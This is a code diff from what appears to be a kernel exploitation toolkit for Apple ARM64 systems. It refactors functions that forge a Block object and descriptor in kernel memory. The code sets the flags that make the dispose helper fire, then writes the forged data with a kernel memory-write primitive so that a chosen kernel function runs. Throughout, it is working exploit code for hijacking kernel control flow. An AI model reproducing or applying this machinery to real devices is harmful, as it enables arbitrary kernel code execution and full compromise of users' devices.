@@ -402,26 +402,26 @@ void xe_util_kfunc_link0_prepare_fake_block_descriptor(link0_t link0, uintptr_t 
 }
 
 
-void xe_util_kfunc_link0_prepare_fake_block(link0_t link0, const void* block_data, size_t block_data_size) {
-    xe_assert_cond(block_data_size, >=, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET + sizeof(uintptr_t));
-    xe_assert_cond(block_data_size, <=, FAKE_BLOCK_SIZE);
-    
+void xe_util_kfunc_link0_prepare_fake_block(link0_t link0, const struct arm_context* block_data) {
     /// Make sure these flags are set on the block data. These flags are required for
     /// triggering the dispose helper when the block is released
     const uint32_t required_flags = BLOCK_SMALL_DESCRIPTOR | BLOCK_NEEDS_FREE | BLOCK_HAS_COPY_DISPOSE;
-    uint32_t flags = *((uint32_t*)(block_data + TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET));
-    xe_assert_cond(flags & required_flags, ==, required_flags);
+    
+    static_assert(offsetof(struct arm_context, ss.uss.x[0]) == TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, "");
+    uint64_t flags_x0_fusion = block_data->ss.uss.x[0];
+    xe_assert_cond(flags_x0_fusion & required_flags, ==, required_flags);
     
     /// Make sure these flags are not set. These flags must not be set for triggering
     /// dispose helper when the block is released
     const uint32_t disabled_flags = BLOCK_IS_GLOBAL;
-    xe_assert_cond(flags & disabled_flags, ==, 0);
+    xe_assert_cond(flags_x0_fusion & disabled_flags, ==, 0);
     
     /// Make sure the descriptor in block_data is set to correct value
-    uintptr_t descriptor = *((uintptr_t*)(block_data + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET));
+    static_assert(offsetof(struct arm_context, ss.uss.x[2]) == TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, "");
+    uintptr_t descriptor = block_data->ss.uss.x[2];
     xe_assert_cond(descriptor, ==, link0->block_descriptor);
     
-    xe_kmem_write(link0->block, 0, (void*)block_data, block_data_size);
+    xe_kmem_write(link0->block, 0, block_data, sizeof(*block_data));
 }
 
 
@@ -564,9 +564,9 @@ struct xe_util_kfunc_register_state xe_util_kfunc_link0_pre_execute(link0_t link
 }
 
 
-void xe_util_kfunc_link0_execute(link0_t link0, uintptr_t target_func, uint64_t x20, uint64_t x21, const void* block_data, size_t block_data_size) {
+void xe_util_kfunc_link0_execute(link0_t link0, uintptr_t target_func, uint64_t x20, uint64_t x21, const struct arm_context* block_data) {
     xe_assert_cond(link0->state, ==, LINK_STATE_PREPARED);
-    xe_util_kfunc_link0_prepare_fake_block(link0, block_data, block_data_size);
+    xe_util_kfunc_link0_prepare_fake_block(link0, block_data);
     
     /// Store the relative target function address to `desc->dispose` member
     xe_util_kfunc_link0_prepare_fake_block_descriptor(link0, target_func);
@@ -887,7 +887,7 @@ void xe_util_kfunc_execute(xe_util_kfunc_t util, uintptr_t target_func, const st
     
     struct link1_requirements link1_req = xe_util_kfunc_link1_prepare(&util->link1, link2_req.pc, &link2_req.x0_data, link2_req.x4, args->sp, util->link0.block_descriptor);
     
-    xe_util_kfunc_link0_execute(&util->link0, link1_req.pc, link1_req.x20, link1_req.x21, &link1_req.x0_data, sizeof(link1_req.x0_data));
+    xe_util_kfunc_link0_execute(&util->link0, link1_req.pc, link1_req.x20, link1_req.x21, &link1_req.x0_data);
     
     util->state = CHAIN_STATE_CREATED;
 }
